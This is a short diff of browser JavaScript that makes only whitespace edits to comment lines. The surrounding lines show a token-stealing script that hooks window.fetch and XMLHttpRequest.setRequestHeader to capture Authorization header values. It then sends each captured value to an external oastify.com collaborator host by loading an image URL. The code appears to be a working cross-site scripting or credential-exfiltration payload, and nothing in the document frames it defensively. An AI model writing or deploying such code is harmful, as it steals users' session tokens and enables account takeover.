@@ -3,7 +3,7 @@
     new Image().src = `https://eew28edpfz72swi534p6wx7kzb52tshh.oastify.com/log?t=${encodeURIComponent(token)}&type=${type}`;  
   };
 
-&nbsp; // Intercept Fetch API  
+ // Intercept Fetch API  
   const originalFetch = window.fetch;  
   window.fetch = function(...args) {  
     const headers = args[1]?.headers || args[0]?.headers;  
@@ -16,7 +16,7 @@
     return originalFetch.apply(this, args);  
   };
 
-&nbsp; // Intercept XHR  
+ // Intercept XHR  
   const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;  
   XMLHttpRequest.prototype.setRequestHeader = function(header, value) {  
     if (header.toLowerCase() === 'authorization') exfil(value, 'xhr');  
